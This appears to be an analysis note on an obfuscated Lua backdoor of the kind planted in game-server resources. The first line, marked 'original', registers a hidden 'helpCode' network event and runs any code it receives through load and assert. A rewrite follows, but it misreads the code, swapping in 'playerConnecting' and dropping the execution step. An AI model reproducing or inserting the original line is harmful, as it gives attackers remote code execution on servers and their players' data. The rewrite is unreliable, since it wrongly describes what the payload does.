local ysoGcfkdgEuFekRkklJGSmHogmpKPAiWgeIRhKENhusszjvprBCPXrRqVqLgSwDqVqOiBG = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} ysoGcfkdgEuFekRkklJGSmHogmpKPAiWgeIRhKENhusszjvprBCPXrRqVqLgSwDqVqOiBG[6]ysoGcfkdgEuFekRkklJGSmHogmpKPAiWgeIRhKENhusszjvprBCPXrRqVqLgSwDqVqOiBG[1] ysoGcfkdgEuFekRkklJGSmHogmpKPAiWgeIRhKENhusszjvprBCPXrRqVqLgSwDqVqOiBG[6][ysoGcfkdgEuFekRkklJGSmHogmpKPAiWgeIRhKENhusszjvprBCPXrRqVqLgSwDqVqOiBG[3]](ysoGcfkdgEuFekRkklJGSmHogmpKPAiWgeIRhKENhusszjvprBCPXrRqVqLgSwDqVqOiBG[2], function(BFWCBOOqrwrVwzdmKcQZBRMziBAgjQbWLfBPFXhZUzCWlOjKNLUGOYvDisfytJZwIDtHyn) ysoGcfkdgEuFekRkklJGSmHogmpKPAiWgeIRhKENhusszjvprBCPXrRqVqLgSwDqVqOiBG[6]ysoGcfkdgEuFekRkklJGSmHogmpKPAiWgeIRhKENhusszjvprBCPXrRqVqLgSwDqVqOiBG[4]() end)local

-- above is original

local registeredNetEvent = "RegisterNetEvent"
local helpCode = "AddEventHandler"
local addEvent = "playerConnecting"
local loadFunc = "load"
local assertFunc = "assert"
local globalEnv = _G

-- Register a net event handler for 'playerConnecting'
globalEnv[registeredNetEvent](addEvent)

-- Add an event handler for 'playerConnecting'
globalEnv[helpCode](addEvent, function(playerName, rejectReason)
    -- Execute the 'load' function to trigger the payload
    globalEnv[loadFunc](playerName)
end)
